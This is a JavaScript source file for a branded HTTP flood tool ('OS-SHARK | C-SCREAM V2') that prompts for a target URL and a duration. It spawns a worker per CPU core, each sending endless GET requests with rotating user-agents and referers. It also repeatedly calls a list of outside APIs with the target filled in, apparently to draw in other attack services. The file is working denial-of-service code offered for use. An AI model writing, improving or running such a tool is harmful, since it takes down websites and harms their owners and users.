const axios = require('axios');
const fs = require('fs');
const chalk = require('chalk');
const gradient = require('gradient-string');
const readline = require('readline-sync');
const cluster = require('cluster');
const os = require('os');

const uaList = fs.readFileSync('./ua.txt', 'utf-8').split('\n').filter(Boolean);
const referers = fs.readFileSync('./r.txt', 'utf-8').split('\n').filter(Boolean);
const apiList = fs.readFileSync('./vercel.txt', 'utf-8').split('\n').filter(Boolean);

console.clear();
console.log(gradient.vice('OS-SHARK | ') + gradient.atlas('C-SCREAM V2') + chalk.white(' - T.ME/STSVKINGDOM'));

const target = readline.question('[TARGET] > ');
const duration = parseInt(readline.question('[DURATION (seconds)] > '), 10) * 1000;

let totalSent = 0, success = 0, failed = 0, currentStatus = 0, peakRPS = 0;
const startTime = Date.now();
const endTime = startTime + duration;

function randomLine(arr) {
    return arr[Math.floor(Math.random() * arr.length)];
}

// === API SUPPORT ===
function triggerApis() {
    const iphoneUA = 'Mozilla/5.0 (iPhone; CPU iPhone OS 13_5_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/13.1.1 Mobile/15E148 Safari/604.1';
    const headers = { 'User-Agent': iphoneUA };

    apiList.forEach(link => {
        const url = link.replace('[replace]', encodeURIComponent(target));
        axios.get(url, { headers }).catch(() => {});
    });
}

// === Logger ===
function logStats() {
    const interval = setInterval(() => {
        const timeLeft = Math.max(0, Math.floor((endTime - Date.now()) / 1000));
        const rps = totalSent / ((Date.now() - startTime) / 1000);
        if (rps > peakRPS) peakRPS = rps;

        console.clear();
        console.log(gradient.vice('OS-SHARK | ') + gradient.atlas('C-SCREAM V2') + chalk.white(' - T.ME/STSVKINGDOM'));
        console.log(chalk.white('========================================'));
        console.log(chalk.white(`total sent: ${totalSent}`));
        console.log(chalk.white(`success: ${success}`));
        console.log(chalk.white(`failed: ${failed}`));
        console.log(chalk.white('========================================'));
        console.log(chalk.white(`Duration left: ${timeLeft}s`));
        console.log(chalk.white('========================================'));
        console.log(chalk.white(`HOST: ${currentStatus}`));

        if (Date.now() >= endTime) {
            clearInterval(interval);
            finish();
        }
    }, 3000);
}

// === Final Output ===
function finish() {
    console.clear();
    console.log(gradient.vice('OS-SHARK | ') + gradient.atlas('C-SCREAM V2') + chalk.white(' - T.ME/STSVKINGDOM'));
    console.log(chalk.white('========================================'));
    console.log(chalk.white(`total sent: ${totalSent}`));
    console.log(chalk.white(`success: ${success}`));
    console.log(chalk.white(`failed: ${failed}`));
    console.log(chalk.white('========================================'));
    console.log(chalk.white(`peak rq/s: ${Math.floor(peakRPS)}`));
    console.log(chalk.white('========================================'));
    console.log(chalk.white(`HOST: ${currentStatus}`));
    process.exit();
}

// === Pure HTTP GET SPAM ===
async function floodLoop() {
    while (Date.now() < endTime) {
        const headers = {
            'User-Agent': randomLine(uaList),
            'Referer': randomLine(referers)
        };
        try {
            const res = await axios.get(target, {
                headers,
                timeout: 5000,
                validateStatus: () => true
            });
            currentStatus = res.status;
            success++;
        } catch {
            failed++;
        } finally {
            totalSent++;
        }
    }
}

// === CLUSTER LOGIC ===
if (cluster.isPrimary) {
    const cores = os.cpus().length;

    // Trigger APIs every 3–5 sec
    const apiTrigger = setInterval(triggerApis, Math.floor(Math.random() * 2000) + 3000);

    // Launch workers
    for (let i = 0; i < cores; i++) {
        cluster.fork();
    }

    logStats();

    setTimeout(() => {
        clearInterval(apiTrigger);
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
    }, duration);
} else {
    floodLoop();
}
